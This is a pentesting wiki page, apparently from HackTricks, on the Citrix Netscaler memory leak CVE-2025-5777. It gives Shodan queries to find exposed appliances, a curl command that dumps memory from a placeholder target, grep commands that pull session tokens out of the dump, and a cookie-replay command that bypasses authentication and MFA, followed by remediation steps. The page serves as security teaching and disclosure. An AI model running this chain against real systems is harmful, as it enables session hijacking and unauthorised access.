# Memory Leak Exploitation

{{#include ../banners/hacktricks-training.md}}

## Overview

Citrix CVE-2025-5777, also known as CitrixBleed 2: Electric Boogaloo, is a remote, unauthenticated memory-leak vulnerability in Citrix Netscaler Gateway and AAA virtual servers. By issuing a crafted HTTP GET request to the management interface, an attacker can retrieve a raw memory dump containing sensitive data such as session tokens.

## CVE-2025-5777 â€“ CitrixBleed 2

- Vulnerable endpoint: Netscaler HTTP management interface (Gateway/AAA virtual servers).
- Exploitability: Remote, unauthenticated (no credentials or MFA required).
- Impact: Confidentiality (leaks plaintext session tokens for ICA/RDP channels).

## Reconnaissance

Identify internet-exposed Netscaler instances using Shodan:

```bash
# Favicon hash (Citrix Netscaler)
http.favicon.hash:-1292923998,-1166125415

# Combined with organizational filters
org:YourOrg http.favicon.hash:-1292923998,-1166125415
ssl:YourOrg html:Citrix
```

## Exploitation

1. Send crafted GET request to dump memory:

```bash
curl -s http://TARGET_IP/<vulnerable/interface> -o memory_dump.bin
```

2. Analyze the memory dump for session tokens:

```bash
# Search for Citrix session tokens
strings memory_dump.bin | grep -E "CITRIXSESSION|PCoIP"

# Or use xxd and grep
xxd memory_dump.bin | grep "CITRIXSESSION"
``` 

## Session Hijacking

Extracted tokens can be replayed by including them in the `Cookie` header of ICA or PCoIP connection requests, bypassing authentication and MFA:

```bash
curl -s -H "Cookie: CITRIXSESSION=<token>" \
     "http://TARGET_IP/<ICA_or_PCoIP_endpoint>"
```

## Remediation

1. Upgrade all affected Citrix Netscaler appliances to the fixed builds as per Citrix advisory.
2. Invalidate any leaked tokens by terminating active sessions on appliances:

```bash
kill icaconnection -all
kill pcoipConnection -all
```

## References

- Original blog post: https://doublepulsar.com/citrixbleed-2-electric-boogaloo-cve-2025-5777
- Citrix Advisory (CTX693420): https://support.citrix.com/article/CTX693420
- CVE details: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-5777
- Previous CitrixBleed (CVE-2023-4966): https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4966

{{#include /banners/hacktricks-training.md}}
